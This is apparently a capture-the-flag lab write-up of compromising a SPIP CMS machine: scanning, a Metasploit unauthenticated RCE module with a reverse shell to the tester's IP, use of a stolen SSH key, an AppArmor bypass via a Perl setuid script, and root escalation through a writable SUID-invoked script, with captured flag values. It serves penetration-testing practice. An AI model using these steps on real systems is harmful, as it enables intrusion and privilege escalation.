FLAG 1  (1 - 11 pictures)
Goal: Gain unauthorized access and capture the user.txt flag from a vulnerable machine running the SPIP CMS.
This project was completed as part of penetration testing practice.

Target Description
Target IP: 10.201.26.102
My Kali IP: 10.10.190.95
Objectives:

Scan the target host and identify open ports.

Discover a vulnerable web application (SPIP CMS).

Gain a reverse shell.

Escalate privileges to the think user.

Find and capture the user.txt flag.

Scanning
Initial Nmap scan revealed:

nmap -sC -sV -p- 10.201.26.102

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.54
Port 80 was open. Visiting the page in a browser showed a standard SPIP CMS interface.

Vulnerability Discovery
Using whatweb, I confirmed the server runs SPIP CMS:

whatweb http://10.201.26.102/
=> SPIP, Apache, PHP
After checking the plugin and core versions, I confirmed it was vulnerable to unauthenticated RCE via the bigup module (spip_bigup_unauth_rce).

Exploitation (First Failed Attempt)
I initially tried to use:

use exploit/unix/webapp/spip_exec
But Metasploit returned:

[-] Failed to load module: exploit/unix/webapp/spip_exec
So this attempt failed.

Successful Exploitation
I then found the correct module in Metasploit:

use exploit/multi/http/spip_bigup_unauth_rce
Set the options:

set RHOSTS 10.201.26.102
set LHOST 10.10.190.95
set LPORT 9001
set TARGETURI /
run
And successfully got:

[*] Command shell session 1 opened
Working in the Shell
Although the shell was unstable, I managed to run basic commands and navigate to the home directory:

cd /home/think
ls -la
Output:


Edit
-rw-r--r-- 1 root root 35 Feb 10  2024 user.txt
Then:

cat user.txt
And retrieved the flag:
fa229046d44eda6a3598c73ad96f4ca5

Conclusion
Despite unstable shell sessions, I successfully:

Identified a SPIP-based web app.

Found an unauthenticated RCE vulnerability via the bigup module.

Gained shell access and navigated the system as user think.

Captured the user.txt flag.

FLAG 2 ! 
I found the SSH private key for user think in /home/think/.ssh/id_rsa.

I downloaded the key locally and successfully connected via SSH:

ssh -i id_rsa think@10.201.77.224
think@publisher:~$
I discovered that AppArmor is installed on the machine:

ls -l /etc/ | grep apparmor
drwxr-xr-x 3 root root 4096 Dec 8 2023 apparmor
drwxr-xr-x 8 root root 4096 Feb 12 2025 apparmor.d
I searched for SUID programs owned by root:

find / -user root -perm -4000 2>/dev/null
I found the program /usr/sbin/run_container.

When I ran it, I saw an error indicating it executes the script /opt/run_container.sh:

bash
Copy
Edit
/opt/run_container.sh: line 16: validate_container_id: command not found
I checked the permissions of /opt/run_container.sh:

ls -l /opt/run_container.sh
-rwxrwxrwx 1 root root 1715 Jan 10 12:40 /opt/run_container.sh
I tried to overwrite the script to get a reverse shell, but permission was denied due to AppArmor restrictions:

echo "/bin/bash -i" > /opt/run_container.sh
ash: /opt/run_container.sh: Permission denied
I analyzed the AppArmor profile applied to the current shell /usr/sbin/ash:

cat /etc/apparmor.d/usr.sbin.ash
It showed that writing to /opt/ is denied, but writing to /var/tmp/ is allowed.

I confirmed I can write to /var/tmp/:

bash
Copy
Edit
touch /var/tmp/test
ls -l /var/tmp/test
-rw-rw-r-- 1 think think 0 ...
I created a Perl script /var/tmp/test.pl to elevate privileges to root:

#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
I made it executable and ran it:

chmod +x /var/tmp/test.pl
/var/tmp/test.pl
echo $0
/bin/sh
Then I edited /opt/run_container.sh to add a privileged shell invocation with the -p option:

#!/bin/bash
/bin/bash -p  # added line
After that, I ran /usr/sbin/run_container and got a root shell:

/usr/sbin/run_container
bash-5.0# whoami

bash-5.0# cat /root/root.txt
3a4225cc9e85709adda6ef55d6a4f2ca

Due to a temporary GitHub error, I was unable to upload images for the report.
